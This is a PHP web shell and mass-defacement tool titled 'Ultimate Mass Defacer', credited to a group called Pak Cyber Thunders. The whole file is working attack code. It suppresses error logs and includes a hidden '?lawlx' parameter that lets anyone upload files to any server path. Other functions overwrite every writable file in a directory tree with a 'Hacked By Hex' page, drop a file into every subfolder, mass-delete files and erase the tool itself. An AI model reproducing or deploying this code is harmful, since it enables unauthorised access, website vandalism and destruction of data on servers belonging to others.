<html>
<head>
<title>MASS DEFACER ~ PAK CYBER THUNDERS</title>
<link href="https://fonts.googleapis.com/css?family=Monoton" rel="stylesheet">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet"> 
<style>
body { background: #101010;

ul {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: #333;
}

li {
    float: left;
}

li a {
    display: block;
    color: white;
    text-align: center;
    padding: 10px 16px;
    text-decoration: none;
}

a:hover:not(.active) {
    background-color: #111;
}

.active {
background-color:#4CAF50;
}

</style>
</head>
<body class="noselect"> <center> <font face='Iceland' size='4' color='white'>
<font style="font-size:60px; color: #ffffff; font-family: 'Monoton', serif; hid" >Ultimate Mass Defacer</font></a><br> 
<?pHp 
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';



if(isset($_GET["lawlx"])) 	{  echo '<html><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="lawlx"><input type=submit value="Up"></form></body></html>';$lawlx = @$_FILES["lawlx"];   if ($lawlx["name"] != '') {  $fullpath = $_REQUEST["path"] . $lawlx["name"];  if (move_uploaded_file($lawlx['tmp_name'], $fullpath)) {     echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>"; }} }

if(isset($_GET["rm"])) 	{
$fh = fopen('UMD.php', 'a');
fwrite($fh, '<h1>Removed</h1>');
fclose($fh);
unlink('UMD.php'); }

echo "<center><form action=\"\" method=\"post\">
";
$dirr = $_POST['d_dir']; 
$index = $_POST["script"];
$index = str_replace('"', "'", $index);
$index = stripslashes($index);
function edit_file($file, $index) {
    if (is_writable($file)) {
        clear_fill($file, $index);
        echo "<Span style='color:green;'><strong> [+] Hogaya 100% Successfull </strong></span><br></center>";
    } else {
        echo "<Span style='color:red;'><strong> [-] failed :( </strong></span><br></center>"; 
    }
} 

function hapus_massal($dir, $namafile) {
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                if (file_exists("$dir/$namafile")) {
                    unlink("$dir/$namafile");
                }
            } elseif ($dirb === '..') {
                if (file_exists("" . dirname($dir) . "/$namafile")) {
                    unlink("" . dirname($dir) . "/$namafile");
                }
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        if (file_exists($lokasi)) {
                            echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                            unlink($lokasi);
                            $idx = hapus_massal($dirc, $namafile);
                        }
                    }
                }
            }
        }
    }
}
function clear_fill($file, $index) {
    if (file_exists($file)) {
        $handle = fopen($file, 'w');
        fwrite($handle, '');
        fwrite($handle, $index);
        fclose($handle);
    }
}
function gass() {
    global $dirr, $index;
    chdir($dirr);
    $me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
    $files = scandir($dirr);
    $notallow = array(".htaccess", "Web.Config", "UMD.php", ".jpg", ".png", ".js", ".css", "Web.config", "web.config", "web.Config", "..", ".");
    sort($files);
    $n = 0;
    foreach ($files as $file) {
        if ($file != $me && is_dir($file) != 1 && !in_array($file, $notallow)) {
            echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
            edit_file($file, $index);
            flush();
            $n = $n + 1;
        }
    }
    echo "<br>";
    echo "<center><br><h3>$n Files Defaced </h3></center><br> ";
} 
function ListFiles($dirrall) {
    if ($dh = opendir($dirrall)) {
        $files = Array();
        $inner_files = Array();
        $me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
        $notallow = array($me, ".htaccess", "Web.Config", "UMD.php", ".jpg", ".png", ".js", ".css", "Web.config", "web.config", "web.Config");
        while ($file = readdir($dh)) {
            if ($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow)) {
                if (is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
        }
        closedir($dh);
        return $files;
    }
}
function gass_all() {
    global $index;
    $dirrall = $_POST['d_dir'];
    foreach (ListFiles($dirrall) as $key => $file) {
        $file = str_replace('//', "/", $file);
        echo "<center><strong>$file</strong> ===>";
        edit_file($file, $index);
        flush();
    }
    $key = $key + 1;
    echo "<center><br><h3>$key Files Defaced </h3></center><br>";
}
function sabun_massal($dir, $namafile, $isi_script) {
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                file_put_contents($lokasi, $isi_script);
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "[<font color=lime>DONE</font>] $lokasi<br>";
                        file_put_contents($lokasi, $isi_script);
                        $idx = sabun_massal($dirc, $namafile, $isi_script);
                    }  } }  } }
} 
if ($_POST['mass'] == 'onedir') {
    echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>
";
    $ini = "http://";
    $mainpath = $_POST[d_dir];
    $file = $_POST[d_file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[script]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", "w+");
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo "$ini$row/$file
";
        }
    }
    echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>
";
    $mainpath = $_POST[d_dir];
    $file = $_POST[d_file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[script]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", "w+");
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>';
        }
    }
} elseif ($_POST['mass'] == 'sabunkabeh') {
    gass();
} elseif ($_POST['mass'] == 'hapusmassal') {
    hapus_massal($_POST['d_dir'], $_POST['d_file']);
} elseif ($_POST['mass'] == 'sabunmematikan') {
    gass_all();
} elseif ($_POST['mass'] == 'massdeface') {
    echo "<div style='margin: 5px auto; padding: 5px'>";
    sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
    echo "</div>";
} else {
    echo " </div>
		<center>
		
		
		<font face='Iceland' size='5' color='white'>
		Select Type:<br>
		</font>
	
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Current Dir All Files</option>
		<option value=\"sabunmematikan\">Replace Everything With Deface</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		
		<font face='Iceland' size='5' color='white'>Folder:</font><br>
		
		<input name='d_dir' value='".getcwd()."' required='' type='text' style='width: 450px;' height='10'><br>


		<font face='Iceland' size='5' color='white'>Filename:</font><br>
		
		<input type='text' name='d_file' value='hex.php' style='width: 450px;' height='10'><br>

		<font face='Iceland' size='5' color='white'>Index File:</font><br>
		
		
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Hex</textarea><br><input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>"; }                                              
  ?> 
  <font face="Iceland" size="5" color="white">Ultimate Mass Defacer =)) Created By <a href="https://www.facebook.com/Typhonic.Chokra"> <font face="Iceland" size="5" color="white"> Hex </font> </a> = ))<br>
   <font face="Iceland" size="5" color="white">Team::</font> <a href="https://www.facebook.com/PakCyberThunders"> <font face="Iceland" size="5" color="white"> Pak Cyber Thunders </font></a>  <br> </center></font> </body>

</div></html>
